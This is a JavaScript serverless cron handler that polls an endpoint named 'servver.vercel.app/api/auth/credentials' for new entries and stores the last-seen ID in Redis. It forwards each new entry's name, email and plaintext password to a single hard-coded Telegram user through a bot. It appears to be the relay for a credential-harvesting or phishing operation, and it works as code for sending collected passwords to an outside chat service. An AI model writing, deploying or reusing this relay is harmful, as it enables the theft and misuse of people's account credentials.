import fetch from "node-fetch";
import { Redis } from "@upstash/redis";

const BOT_TOKEN = process.env.BOT_TOKEN;
const ALLOWED_USER_ID = "6089461664";
const JSON_URL = "https://servver.vercel.app/api/auth/credentials";

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    // Security: verify this is a cron request
    const authHeader = req.headers.authorization;
    if (authHeader !== `Bearer ${process.env.CRON_SECRET}`) {
        return res.status(401).json({ error: "Unauthorized" });
    }

    try {
        // Fetch the JSON file
const response = await fetch(JSON_URL);
const result = await response.json();

// Extract the data array
const json = result.data || [];

if (!Array.isArray(json) || json.length === 0) {
            console.log("JSON is empty or invalid");
            return res.status(200).json({ status: "empty" });
        }
        
        // Get latest entry
        const latest = json[json.length - 1];
        const latestId = latest._id;
        
        // Load stored last-seen ID
        const lastSeen = await redis.get("last_seen_id");
        
        // First-time setup
        if (!lastSeen) {
            await redis.set("last_seen_id", latestId);
            await sendMsg(ALLOWED_USER_ID, "✅ Monitoring started. Current entry ID: " + latestId);
            return res.status(200).json({ status: "initialized", id: latestId });
        }
        
        // Check if new entry exists
        if (latestId !== lastSeen) {
            await redis.set("last_seen_id", latestId);
            
            const msg =
`🔥 NEW ENTRY DETECTED
-------------------------
Name: ${latest.name}
Email: ${latest.email}
Password: ${latest.password}
Created: ${latest.createdAt}
ID: ${latest._id}
-------------------------`;
            
            await sendMsg(ALLOWED_USER_ID, msg);
            return res.status(200).json({ status: "new_entry", id: latestId });
        }
        
        return res.status(200).json({ status: "no_change", id: latestId });
        
    } catch (err) {
        console.error("Cron error:", err);
        await sendMsg(ALLOWED_USER_ID, "❌ Monitoring error: " + err.message);
        return res.status(500).json({ error: err.message });
    }
}

async function sendMsg(chatId, text) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    });
}
